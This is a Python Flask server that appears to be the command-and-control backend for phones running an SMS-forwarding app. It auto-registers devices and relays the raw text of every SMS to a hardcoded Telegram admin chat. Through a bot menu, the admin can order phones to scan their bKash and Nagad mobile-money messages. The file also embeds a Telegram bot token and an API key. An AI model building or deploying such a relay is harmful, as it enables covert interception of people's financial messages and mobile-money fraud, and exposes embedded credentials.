from flask import Flask, request, jsonify
import os, json, urllib.request, urllib.parse
from datetime import datetime

app = Flask(__name__)

API_KEY   = "mySecretKey_12345"
BOT_TOKEN = "8988458629:AAG_soF532b0l2xarRnfxwm7GGsVYzQ-rEU"
ADMIN_ID  = "5971752529"

DEVICES_FILE = "devices.json"
COMMANDS_FILE = "commands.json"
PENDING_FILE = "pending_cmd.json"

def load_json(path, default=None):
    if default is None: default = {}
    try:
        if os.path.exists(path):
            with open(path, "r") as f: return json.load(f)
    except: pass
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f: json.dump(data, f)
    except: pass

def tg_send(chat_id, text, keyboard=None):
    try:
        url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        if keyboard: payload["reply_markup"] = json.dumps(keyboard)
        data = urllib.parse.urlencode(payload).encode("utf-8")
        urllib.request.urlopen(urllib.request.Request(url, data=data, method="POST"), timeout=10)
    except Exception as e: print("Error:", e)

def main_keyboard():
    return {
        "keyboard": [[{"text": "📊 All Users"}], [{"text": "🆘 Help"}]],
        "resize_keyboard": True, "is_persistent": True
    }

def device_type_keyboard():
    return {
        "keyboard": [[{"text": "💗 bKash"}, {"text": "🟠 Nagad"}], [{"text": "🔙 Back to Users"}]],
        "resize_keyboard": True, "is_persistent": True
    }

@app.route("/webhook/<token>", methods=["POST"])
def webhook(token):
    if token != BOT_TOKEN.split(":")[0]: return "ok"
    update = request.get_json(force=True, silent=True) or {}
    
    if "message" in update:
        chat_id = str(update["message"]["chat"]["id"])
        text = update["message"].get("text", "")
        
        if chat_id != ADMIN_ID: return "ok"
        
        if text in ["/start", "/menu"]:
            tg_send(chat_id, "🤖 <b>Main Menu</b>\nনিচের বাটন থেকে কাজ করুন।", main_keyboard())
            
        elif text == "📊 All Users":
            devices = load_json(DEVICES_FILE, {})
            if not devices:
                tg_send(chat_id, "📭 কোনো ডিভাইস নেই। অ্যাপটি একবার ওপেন করুন।", main_keyboard())
            else:
                buttons = []
                for code in devices.keys():
                    buttons.append([{"text": f"📱 {code}"}])
                buttons.append([{"text": "🔙 Back"}])
                kb = {"keyboard": buttons, "resize_keyboard": True, "is_persistent": True}
                tg_send(chat_id, "👇 যেকোনো ইউজার সিলেক্ট করুন:", kb)

        elif text in ["🔙 Back", "🔙 Back to Users"]:
            tg_send(chat_id, "Main Menu:", main_keyboard())
            
        elif text.startswith("📱 "):
            device_code = text.replace("📱 ", "")
            commands = load_json(COMMANDS_FILE, {})
            commands[chat_id] = {"selected_device": device_code}
            save_json(COMMANDS_FILE, commands)
            tg_send(chat_id, f"📱 <b>User: {device_code}</b>\nকোন ধরনের ট্রানজেকশন দেখতে চান?", device_type_keyboard())
            
        elif text in ["💗 bKash", "🟠 Nagad"]:
            stype = "bKash" if "bKash" in text else "Nagad"
            commands = load_json(COMMANDS_FILE, {})
            if chat_id in commands and "selected_device" in commands[chat_id]:
                device = commands[chat_id]["selected_device"]
                commands[chat_id]["waiting_for_text"] = True
                commands[chat_id]["type"] = stype
                save_json(COMMANDS_FILE, commands)
                tg_send(chat_id, f"🔄 <b>{stype}</b> এর জন্য <b>{device}</b> এর কোন মেসেজ থেকে হিসাব করতে চান?\n(মেসেজের TrxID বা ছোট টেক্সট দিন):")
            else:
                tg_send(chat_id, "❌ আগে All Users থেকে একটি ডিভাইস সিলেক্ট করুন।", main_keyboard())

        elif text == "🆘 Help":
            tg_send(chat_id, "এই বট দিয়ে আপনি SMS এর টোটাল হিসাব দেখতে পারবেন।", main_keyboard())
            
        else:
            commands = load_json(COMMANDS_FILE, {})
            if chat_id in commands and commands[chat_id].get("waiting_for_text"):
                stype = commands[chat_id]["type"]
                device = commands[chat_id]["selected_device"]
                pending = load_json(PENDING_FILE, {})
                pending[device] = f"{stype}|{text}" 
                save_json(PENDING_FILE, pending)
                del commands[chat_id]
                save_json(COMMANDS_FILE, commands)
                tg_send(chat_id, f"⏳ <b>{device}</b> এর কাছে রিকোয়েস্ট পাঠানো হয়েছে। ফোন অনলাইন থাকলে রেজাল্ট আসবে...", main_keyboard())

    return "ok"

@app.route("/get-command", methods=["GET"])
def get_command():
    device = request.args.get("device")
    pending = load_json(PENDING_FILE, {})
    if device in pending:
        cmd = pending[device]
        del pending[device]
        save_json(PENDING_FILE, pending)
        return cmd
    return "NONE"

@app.route("/send-result", methods=["POST"])
def send_result():
    data = request.json
    device = data.get("device")
    stype = data.get("type")
    amount = data.get("amount")
    count = data.get("count")
    msg = f"✅ <b>Scan Result</b>\n━━━━━━━━━━━━━━━\n📱 Device: <code>{device}</code>\n🔍 Type: {stype}\n💰 Total Amount: <b>{amount} TK</b>\n📩 Total SMS: <b>{count}</b>"
    tg_send(ADMIN_ID, msg)
    return "ok"

@app.route("/sms", methods=["POST"])
def sms():
    key = request.headers.get("X-API-KEY", "")
    if key != API_KEY: return jsonify({"status": "error"}), 401
    data = request.get_json(force=True, silent=True) or {}
    device = data.get("device", "UNKNOWN")
    
    devices = load_json(DEVICES_FILE, {})
    if device not in devices:
        devices[device] = {"approved": True}
        save_json(DEVICES_FILE, devices)
        tg_send(ADMIN_ID, f"🆕 নতুন ডিভাইস যুক্ত হলো: <code>{device}</code>")

    msg = f"📩 <b>New SMS</b>\n📱 Device: <code>{device}</code>\n📄 <code>{data.get('raw','')}</code>"
    tg_send(ADMIN_ID, msg)
    return "ok"

@app.route("/", methods=["GET"])
def home():
    return "Server is Running ✅"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
